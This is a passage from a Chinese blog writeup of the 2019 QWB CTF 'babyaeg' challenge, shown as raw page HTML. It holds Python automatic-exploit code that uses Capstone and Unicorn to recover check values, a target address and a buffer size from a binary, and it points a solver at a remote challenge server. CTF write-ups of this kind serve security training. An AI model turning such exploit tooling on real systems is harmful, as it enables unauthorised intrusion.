int(disasm_result[i].op_str[disasm_result[i].op_str.find(<span class="string">"+"</span>) + <span class="number">2</span>:<span class="number">-1</span>], <span class="number">16</span>)</span><br><span class="line">                    fuck_addr = tmp+disasm_result[i+<span class="number">1</span>].address</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">print</span> hex(fuck_addr)</span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">            find address of main() and 1st function</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">get_end</span><span class="params">(start_addr)</span>:</span></span><br><span class="line">            offset = self.elf.vaddr_to_offset(start_addr)</span><br><span class="line">            disasm_result = md.disasm(</span><br><span class="line">                bytecode[offset:offset + <span class="number">0x1000</span>], start_addr)</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> disasm_result:</span><br><span class="line">                <span class="keyword">if</span> i.mnemonic == <span class="string">'ret'</span>:</span><br><span class="line">                    <span class="keyword">return</span> i.address</span><br><span class="line"></span><br><span class="line">        array_result = []</span><br><span class="line">        mu = Uc(UC_ARCH_X86, UC_MODE_64)</span><br><span class="line">        mu.mem_map(<span class="number">0x400000</span>, <span class="number">1024</span> * <span class="number">1024</span>)</span><br><span class="line">        mu.mem_map(<span class="number">0</span>, <span class="number">1024</span> * <span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">get_answer</span><span class="params">(current_start)</span>:</span></span><br><span class="line">            start_addr = self.elf.vaddr_to_offset(current_start)</span><br><span class="line">            end_addr = self.elf.vaddr_to_offset(get_end(current_start)) + <span class="number">1</span></span><br><span class="line">            disasm_result = md.disasm(</span><br><span class="line">                bytecode[start_addr:end_addr], current_start)</span><br><span class="line">            disasm_result = list(disasm_result)</span><br><span class="line">            tmp = []</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(len(disasm_result)):</span><br><span class="line">                <span class="keyword">if</span> disasm_result[i].mnemonic == <span class="string">"cmp"</span>:</span><br><span class="line">                    tmp.append(</span><br><span class="line">                        ctypes.c_uint8(int(disasm_result[i].op_str[disasm_result[i].op_str.find(<span class="string">","</span>) + <span class="number">2</span>:], <span class="number">16</span>)).value)</span><br><span class="line">            count = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(len(disasm_result)):</span><br><span class="line">                <span class="keyword">if</span> disasm_result[i].mnemonic == <span class="string">'jne'</span>:</span><br><span class="line">                    <span class="keyword">if</span> count == <span class="number">0</span>:</span><br><span class="line">                        calc_start = i + <span class="number">1</span></span><br><span class="line">                    <span class="keyword">elif</span> count == <span class="number">1</span>:</span><br><span class="line">                        calc_end = i</span><br><span class="line">                    count += <span class="number">1</span></span><br><span class="line">            calc_code = bytecode[self.elf.vaddr_to_offset(</span><br><span class="line">                disasm_result[calc_start].address):self.elf.vaddr_to_offset(disasm_result[calc_end].address)]</span><br><span class="line">            <span class="comment"># print calc_code.encode('hex')</span></span><br><span class="line"></span><br><span class="line">            mu.mem_write(<span class="number">0x400000</span>, calc_code)</span><br><span class="line">            mu.reg_write(UC_X86_REG_RBP, <span class="number">0xc</span>)</span><br><span class="line">            mu.mem_write(<span class="number">0</span>, p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(tmp[<span class="number">0</span>]))</span><br><span class="line">            mu.emu_start(<span class="number">0x400000</span>, <span class="number">0x400000</span> + len(calc_code))</span><br><span class="line"></span><br><span class="line">            <span class="comment"># print mu.reg_read(UC_X86_REG_AL)-59</span></span><br><span class="line">            <span class="comment"># print tmp</span></span><br><span class="line">            <span class="comment"># for i in range(calc_start, calc_end):</span></span><br><span class="line">            <span class="comment">#     print("0x%x:\t%s\t%s" % (</span></span><br><span class="line">            <span class="comment">#         disasm_result[i].address, disasm_result[i].mnemonic, disasm_result[i].op_str))</span></span><br><span class="line">            tmp[<span class="number">1</span>] = ctypes.c_uint8(int(mu.reg_read(UC_X86_REG_AL) - tmp[<span class="number">1</span>])).value</span><br><span class="line"></span><br><span class="line">            count = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(len(disasm_result)):</span><br><span class="line">                <span class="keyword">if</span> disasm_result[i].mnemonic == <span class="string">'jne'</span>:</span><br><span class="line">                    <span class="keyword">if</span> count == <span class="number">1</span>:</span><br><span class="line">                        calc_start = i + <span class="number">1</span></span><br><span class="line">                    <span class="keyword">elif</span> count == <span class="number">2</span>:</span><br><span class="line">                        calc_end = i</span><br><span class="line">                    count += <span class="number">1</span></span><br><span class="line">            calc_code = bytecode[self.elf.vaddr_to_offset(</span><br><span class="line">                disasm_result[calc_start].address):self.elf.vaddr_to_offset(disasm_result[calc_end].address)]</span><br><span class="line"></span><br><span class="line">            mu.mem_write(<span class="number">0x400000</span>, calc_code)</span><br><span class="line">            mu.reg_write(UC_X86_REG_RBP, <span class="number">0xc</span>)</span><br><span class="line">            mu.mem_write(<span class="number">0</span>, p32(<span class="number">0</span>) + p32(tmp[<span class="number">1</span>]) + p32(tmp[<span class="number">0</span>]))</span><br><span class="line">            mu.emu_start(<span class="number">0x400000</span>, <span class="number">0x400000</span> + len(calc_code))</span><br><span class="line">            tmp[<span class="number">2</span>] = ctypes.c_uint8(int(mu.reg_read(UC_X86_REG_AL) - tmp[<span class="number">2</span>])).value</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(len(disasm_result)):</span><br><span class="line">                <span class="keyword">if</span> disasm_result[i].mnemonic == <span class="string">'call'</span>:</span><br><span class="line">                    <span class="keyword">return</span> int(disasm_result[i].op_str, <span class="number">16</span>), tmp</span><br><span class="line">        next_addr = first_func_start</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">48</span> / <span class="number">3</span>):</span><br><span class="line">            next_addr, array_ans_3 = get_answer(next_addr)</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> array_ans_3:</span><br><span class="line">                array_result.append(j)</span><br><span class="line"></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        stage1 end</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">last_3</span><span class="params">(current_start)</span>:</span></span><br><span class="line">            calc_code = bytecode[self.elf.vaddr_to_offset(current_start):self.elf.vaddr_to_offset(get_end(current_start))]</span><br><span class="line">            disasm_result = list(md.disasm(calc_code, current_start))</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(len(disasm_result)):</span><br><span class="line">                <span class="keyword">if</span> <span class="string">"rdi"</span> <span class="keyword">in</span> disasm_result[i].op_str:</span><br><span class="line">                    calc_start = disasm_result[i].address</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(len(disasm_result)):</span><br><span class="line">                <span class="keyword">if</span> disasm_result[i].mnemonic == <span class="string">"cmp"</span>:</span><br><span class="line">                        <span class="comment"># print hex(disasm_result[i].address)</span></span><br><span class="line">                        tmp = ctypes.c_uint8(int(disasm_result[i].op_str[disasm_result[i].op_str.find(<span class="string">","</span>) + <span class="number">2</span>:], <span class="number">16</span>)).value</span><br><span class="line">                        calc_end = disasm_result[i].address</span><br><span class="line">                <span class="keyword">elif</span> disasm_result[i].mnemonic == <span class="string">"call"</span>:</span><br><span class="line">                    next_addr = int(disasm_result[i].op_str, <span class="number">16</span>)</span><br><span class="line">            calc_code = bytecode[self.elf.vaddr_to_offset(calc_start):self.elf.vaddr_to_offset(calc_end)]</span><br><span class="line"></span><br><span class="line">            disasm_result = list(md.disasm(calc_code, calc_start))</span><br><span class="line"></span><br><span class="line">            mu.mem_write(<span class="number">0x400000</span>, calc_code)</span><br><span class="line">            mu.reg_write(UC_X86_REG_RBP, <span class="number">1024</span>*<span class="number">1024</span>)</span><br><span class="line">            ans = <span class="number">0x100</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x100</span>):</span><br><span class="line">                mu.reg_write(UC_X86_REG_RDI, i)</span><br><span class="line">                mu.reg_write(UC_X86_REG_RBP, <span class="number">1024</span>*<span class="number">1024</span>)</span><br><span class="line">                mu.emu_start(<span class="number">0x400000</span>, <span class="number">0x400000</span> + len(calc_code))      </span><br><span class="line">                <span class="keyword">if</span> mu.reg_read(UC_X86_REG_EAX) == tmp:</span><br><span class="line">                    <span class="keyword">return</span> next_addr, i</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">            next_addr, ans = last_3(next_addr)</span><br><span class="line">            array_result.append(ans)</span><br><span class="line"></span><br><span class="line">        calc_code = bytecode[self.elf.vaddr_to_offset(next_addr):self.elf.vaddr_to_offset(get_end(next_addr))]</span><br><span class="line">        disasm_result = list(md.disasm(calc_code, next_addr))</span><br><span class="line">        count = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(disasm_result)):</span><br><span class="line">            <span class="keyword">if</span> disasm_result[i].mnemonic == <span class="string">"lea"</span>:</span><br><span class="line">                count += <span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span> count == <span class="number">2</span>:</span><br><span class="line">                    tmp = int(disasm_result[i].op_str[disasm_result[i].op_str.find(<span class="string">"+"</span>) + <span class="number">2</span>:<span class="number">-1</span>], <span class="number">16</span>)</span><br><span class="line">                    str_addr = self.elf.vaddr_to_offset(tmp+disasm_result[i+<span class="number">1</span>].address)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        array_result.append(bytecode[str_addr:str_addr+<span class="number">8</span>])</span><br><span class="line">        buffer_size = ctypes.c_uint8(int(disasm_result[<span class="number">2</span>].op_str[disasm_result[<span class="number">2</span>].op_str.find(<span class="string">","</span>) + <span class="number">2</span>:], <span class="number">16</span>)).value</span><br><span class="line">        <span class="keyword">print</span> hex(buffer_size)</span><br><span class="line">        <span class="keyword">return</span> array_result, buffer_size, xor_value, fuck_addr</span><br><span class="line"></span><br><span class="line">solve = BASE(</span><br><span class="line">    remote_host=<span class="string">"49.4.26.104"</span>,</span><br><span class="line">    remote_port=<span class="number">32428</span>,</span><br><span class="line">    local_elf=<span class="string">"./aeg0"</span>,</span><br><span class="line">    _remote_libc=<span class="string">"/lib64/libc.so.6"</span>,</span><br><span class="line">    _local_libc=<span class="string">"/lib64/libc.so.6"</span>,</span><br><span class="line">    gdb_script=<span class="string">""</span>,</span><br><span class="line">    _log_level=<span class="string">"info"</span></span><br><span class="line">)</span><br><span class="line"><span class="keyword">print</span> solve.run()</span><br></pre></td></tr></table></figure></p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2019/05/27/qwb2019-qual/">2019强网杯预选赛babyaeg writeup</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页">850</a></p>
+        <p><span>发布时间:</span>2019-05-27, 10:35:51</p>
+        <p><span>最后更新:</span>2019-05-28, 16:19:20</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2019/05/27/qwb2019-qual/" title="2019强网杯预选赛babyaeg writeup">http://850.world/2019/05/27/qwb2019-qual/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://850.world/2019/05/27/qwb2019-qual/　　作者: 850" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2019/04/22/byctf2019-virtual/">
+                    2019国赛 virtual writeup
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">文章目录</strong>
+        
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#题目描述"><span class="toc-number">1.</span> <span class="toc-text">题目描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#题解"><span class="toc-number">2.</span> <span class="toc-text">题解</span></a></li></ol>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-3 i,
+        .toc-level-3 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="隐藏目录" title="点击按钮隐藏或者显示文章目录">
+
+    <script>
+        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
+    </script>
+
+
+
+    
+<div class="share">
+    
+        <div class="bdsharebuttonbox">
+            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
+            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
+            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
+            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
+            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
+            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></a>
+        </div>
+        <script>
+            window._bd_share_config={
+                "common":{"bdSnsKey":{},"bdText":"2019强网杯预选赛babyaeg writeup　| 850's World　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+        </script>
+    
+
+    
+</div>
+
+
+
+
+
+
+
+    
+        <section id="comments">
+    <style> aside.comment-bar { margin: auto 30px; }</style>
+    <div id="disqus_thread"></div>
+    <script>
+        var disqus_config = function(){
+            this.page.url = 'http://850.world/2019/05/27/qwb2019-qual/';
+            this.page.identifier = '2019/05/27/qwb2019-qual/';
+        };
+        var loadComment = function(){
+            var d = document, s = d.createElement('script');
+            s.src = '//850-world.disqus.com/embed.js';
+            s.setAttribute('data-timestamp', +new Date());
+            (d.head || d.body).appendChild(s);
+        }
+    </script>
+    
+    <script> loadComment(); </script>
+
+</section>
+
+
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2019/04/22/byctf2019-virtual/" title="下一篇: 2019国赛 virtual writeup">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2019/05/27/qwb2019-qual/">2019强网杯预选赛babyaeg writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/22/byctf2019-virtual/">2019国赛 virtual writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/18/IOT-security-re/">嵌入式安全踩过的坑(持续更新)</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/31/35c3Junior/">35c3CTF-Junior 两/三道pwn writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/16/os-bonus/">OS 课程bonus的几种思路</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/10/pcb-2/">鹏城杯 2018 决赛 day2 littlenote writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/10/pcb-1/">鹏城杯 2018 决赛 day1 shotshot writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/10/xnuca-library/">XNUCA 2018 final pwn第四题library writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/11/22/pwn-1/">pwn知识点巩固（二）</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/11/20/pwn-0/">pwn知识点巩固（一）</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/11/19/how-to-build-your-blog-with-Hexo/">从零开始的建博客生活</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                <i class="fa fa-copyright"></i> 
+                2018-2019 850
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style="display:none">
+                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>| </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style="display:none">
+                        <span id="page-visit" title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+<script type="text/javascript" src="/js/love.js"></script>
+
+    </div>
+    
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 5;
+                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+<!-- Google Analytics -->
+<script type="text/javascript">
+(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+ga('create', 'UA-129429500-1', 'auto');
+ga('send', 'pageview');
+
+</script>
+<!-- End Google Analytics -->
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        var oOpenInNew = {
+            
+            
+            
+            
+            
+            
+             archives: ".archive-article-title", 
+             miniArchives: "a.post-list-link", 
+            
+             friends: "#js-friends a", 
+             socail: ".social a" 
+        }
+        for (var x in oOpenInNew) {
+            $(oOpenInNew[x]).attr("target", "_blank");
+        }
+    
+</script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div>
+</body>
+</html>
